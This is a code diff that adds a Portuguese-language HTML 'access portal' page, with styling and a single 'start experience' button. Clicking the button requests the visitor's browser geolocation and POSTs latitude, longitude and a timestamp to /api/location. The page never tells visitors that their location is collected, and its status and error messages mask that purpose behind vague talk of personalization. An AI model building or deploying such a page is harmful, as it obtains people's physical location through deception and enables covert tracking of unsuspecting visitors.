@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Acesso</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .welcome-text {
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        .start-btn {
+            padding: 15px 30px;
+            background: transparent;
+            color: white;
+            border: 2px solid white;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        .start-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+            display: none;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bem-vindo ao Portal</h1>
+        <p class="welcome-text">Para uma experiência personalizada e acesso aos nossos serviços, clique no botão abaixo para continuar.</p>
+        <button onclick="iniciarExperiencia()" class="start-btn">
+            Iniciar Experiência
+            <span class="loading" id="loading"></span>
+        </button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function iniciarExperiencia() {
+            const status = document.getElementById('status');
+            const loading = document.getElementById('loading');
+            
+            if (!navigator.geolocation) {
+                status.textContent = 'Não foi possível iniciar a experiência. Por favor, tente em outro navegador.';
+                return;
+            }
+
+            loading.style.display = 'inline-block';
+            status.textContent = 'Iniciando...';
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    fetch('/api/location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        loading.style.display = 'none';
+                        status.textContent = 'Experiência personalizada iniciada com sucesso!';
+                        setTimeout(() => {
+                            status.textContent = 'Redirecionando...';
+                            // Aqui você pode redirecionar para outra página se desejar
+                        }, 1500);
+                    })
+                    .catch(error => {
+                        loading.style.display = 'none';
+                        status.textContent = 'Ocorreu um erro ao iniciar a experiência. Por favor, tente novamente.';
+                        console.error('Error:', error);
+                    });
+                },
+                (error) => {
+                    loading.style.display = 'none';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            status.textContent = 'Para continuar, precisamos da sua permissão para personalizar sua experiência.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            status.textContent = 'Não foi possível iniciar a experiência no momento.';
+                            break;
+                        case error.TIMEOUT:
+                            status.textContent = 'A conexão expirou. Por favor, tente novamente.';
+                            break;
+                        default:
+                            status.textContent = 'Ocorreu um erro inesperado. Por favor, tente novamente.';
+                    }
+                }
+            );
+        }
+    </script>
+</body>
+</html>
